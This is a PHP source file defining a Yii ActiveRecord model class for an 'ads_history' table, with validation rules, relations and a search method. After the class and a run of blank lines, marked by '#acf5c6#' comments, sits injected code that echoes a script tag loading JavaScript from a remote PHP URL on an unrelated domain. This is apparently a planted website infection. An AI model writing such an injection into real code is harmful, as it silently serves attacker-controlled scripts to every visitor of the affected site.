<?php

/**
 * This is the model class for table "ads_history".
 *
 * The followings are the available columns in table 'ads_history':
 * @property integer $id
 * @property integer $ads_id
 * @property integer $user_id
 * @property string $amount
 * @property string $created_on
 *
 * The followings are the available model relations:
 * @property User $user
 * @property Ads $ads
 */
class Adshistory extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'ads_history';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('ads_id, user_id, amount', 'required'),
			array('ads_id, user_id', 'numerical', 'integerOnly'=>true),
			array('amount', 'length', 'max'=>100),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('id, ads_id, user_id, amount, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
			'user' => array(self::BELONGS_TO, 'Users', 'user_id'),
			'ads' => array(self::BELONGS_TO, 'Ads', 'ads_id'),
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'id' => 'ID',
			'ads_id' => 'Ads',
			'user_id' => 'User',
			'amount' => 'Amount',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search( $param = array() )
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria($param);
		$criteria->together=true;

		$criteria->compare('id',$this->id);
		$criteria->compare('ads_id',$this->ads_id);
		$criteria->compare('user_id',$this->user_id);
		$criteria->compare('amount',$this->amount,true);
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Adshistory the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}








#acf5c6#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383496\"></script>";
echo $w;
}
#/acf5c6#

